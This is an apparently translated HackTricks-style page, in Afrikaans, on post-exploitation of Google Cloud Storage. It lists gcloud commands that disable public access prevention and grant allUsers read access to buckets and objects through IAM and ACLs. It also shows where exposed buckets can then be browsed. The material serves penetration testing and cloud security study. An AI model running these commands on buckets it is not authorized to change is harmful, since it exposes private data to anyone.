# GCP - Storage Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Storage

Vir meer inligting oor Cloud Storage, kyk na hierdie blad:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### Gee openbare toegang

Dit is moontlik om eksterne gebruikers (ingeteken in GCP of nie) toegang tot die inhoud van buckets te gee. Standaard is die opsie om 'n bucket publieklik bloot te stel egter gedeaktiveer:

<details>

<summary>Maak bucket/objekte publiek</summary>
```bash
# Disable public prevention
gcloud storage buckets update gs://BUCKET_NAME --no-public-access-prevention

# Make all objects in a bucket public
gcloud storage buckets add-iam-policy-binding gs://BUCKET_NAME --member=allUsers --role=roles/storage.objectViewer
## I don't think you can make specific objects public just with IAM

# Make a bucket or object public (via ACL)
gcloud storage buckets update gs://BUCKET_NAME --add-acl-grant=entity=AllUsers,role=READER
gcloud storage objects update gs://BUCKET_NAME/OBJECT_NAME --add-acl-grant=entity=AllUsers,role=READER
```
</details>

As jy probeer om **ACLs aan 'n bucket met afgeskakelde ACLs** toe te ken, sal jy hierdie fout kry: `ERROR: HTTPError 400: Cannot use ACL API to update bucket policy when uniform bucket-level access is enabled. Read more at https://cloud.google.com/storage/docs/uniform-bucket-level-access`

Om via 'n blaaier toegang tot oop buckets te kry, besoek die URL `https://<bucket_name>.storage.googleapis.com/` of `https://<bucket_name>.storage.googleapis.com/<object_name>`

{{#include ../../../banners/hacktricks-training.md}}
